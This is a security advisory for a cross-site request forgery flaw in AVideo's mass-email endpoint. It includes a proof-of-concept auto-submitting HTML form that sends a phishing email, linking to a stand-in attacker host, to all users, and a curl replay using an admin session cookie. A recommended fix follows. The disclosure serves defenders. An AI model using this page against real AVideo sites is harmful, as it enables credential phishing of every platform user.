# [M] AVideo: CSRF on emailAllUsers.json.php Enables Mass Phishing Email to All Users

## Summary
Severity: Medium
Advisory: GHSA-c4xj-x7p8-3x7q
CVE: CVE-2026-34611
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-c4xj-x7p8-3x7q
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo endpoint `objects/emailAllUsers.json.php` allows administrators to send HTML emails to every registered user on the platform. While the endpoint verifies admin session status, it does not validate a CSRF token. Because AVideo sets `SameSite=None` on session cookies, a cross-origin POST request from an attacker-controlled page will include the admin's session cookie automatically. An attacker who lures an admin to a malicious page can send an arbitrary HTML email to every user on the platform, appearing to originate from the instance's legitimate SMTP address.

The endpoint does not call `save()` on any ORM object, which means the Referer/Origin domain validation implemented in `ObjectYPT::save()` is never triggered, leaving CSRF as the only required protection - and it is absent.

## Details

The endpoint performs an admin check at line 10 but has no CSRF token validation:

```php
// objects/emailAllUsers.json.php:10
if (!User::isAdmin()) {
    die('{"error": "Must be admin"}');
}
```

The message body is taken directly from POST data at line 41:

```php
// objects/emailAllUsers.json.php:41
$obj->message = $_POST['message'];
```

The message is rendered as HTML in the email at line 48:

```php
// objects/emailAllUsers.json.php:48
$mail->msgHTML($obj->message);
```

When the `email` POST parameter is omitted, the endpoint defaults to sending to all registered users by calling `User::getAllUsers()`. This means the attacker does not need to know any email addresses.

The emails are sent through the platform's configured SMTP server, so they originate from the legitimate platform email address and pass SPF/DKIM validation. This makes the phishing emails highly convincing.

## Proof of Concept

Host the following HTML on an attacker-controlled domain and lure an AVideo administrator to visit it:

```html
<!DOCTYPE html>
<html>
<head><title>AVI-038 PoC - CSRF Mass Email</title></head>
<body>
<h1>Please wait...</h1>
<form id="massmail" method="POST"
      action="https://your-avideo-instance.com/objects/emailAllUsers.json.php">

  <input type="hidden" name="subject" value="Important: Verify Your Account" />

  <textarea name="message" style="display:none">
    <h2>Account Verification Required</h2>
    <p>Your account requires re-verification due to a recent security update.</p>
    <p>Please <a href="https://attacker.example.com/phish">click here to verify</a>
       within 24 hours to avoid account suspension.</p>
    <p>Thank you,<br/>The Platform Team</p>
  </textarea>

  <!-- Omitting 'email' parameter causes it to send to ALL users -->
</form>

<script>document.getElementById('massmail').submit();</script>
</body>
</html>
```

**Verification steps:**

1. Set up a test AVideo instance with at least two registered user accounts.
2. Log in as an admin in one browser tab.
3. Open the attacker HTML page in another tab in the same browser.
4. Check the email inboxes of all registered users. Each will have received the phishing email from the platform's legitimate SMTP address.

Alternatively, test with curl using an admin session cookie:

```bash
curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
  -X POST "https://your-avideo-instance.com/objects/emailAllUsers.json.php" \
  -d "subject=Test&message=<h1>PoC</h1><p>This email was sent to all users.</p>"
```

## Impact

An attacker can send attacker-controlled HTML emails to every registered user on an AVideo platform by exploiting the admin's session via CSRF. The emails originate from the platform's legitimate SMTP address, pass email authentication checks (SPF, DKIM, DMARC), and appear indistinguishable from genuine platform communications. This enables:

- Mass phishing campaigns targeting all platform users with highly credible emails
- Credential harvesting by directing users to attacker-controlled login pages
- Malware distribution via HTML email payloads
- Reputation damage to the platform operator

The attack requires only a single click from an authenticated admin (visiting an attacker-controlled page). No user enumeration or email address knowledge is needed.

- **CWE-352**: Cross-Site Request Forgery

## Recommended Fix

Add CSRF token validation at `objects/emailAllUsers.json.php:13`, after the admin check:

```php
// objects/emailAllUsers.json.php:13
if (!isGlobalTokenValid()) {
    forbiddenPage('Invalid CSRF token');
    exit;
}
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-c4xj-x7p8-3x7q
- https://nvd.nist.gov/vuln/detail/CVE-2026-34611
- https://github.com/WWBN/AVideo/commit/226ad24a51edac57e079ac92ca95c82e1e23e3cf
- https://github.com/WWBN/AVideo
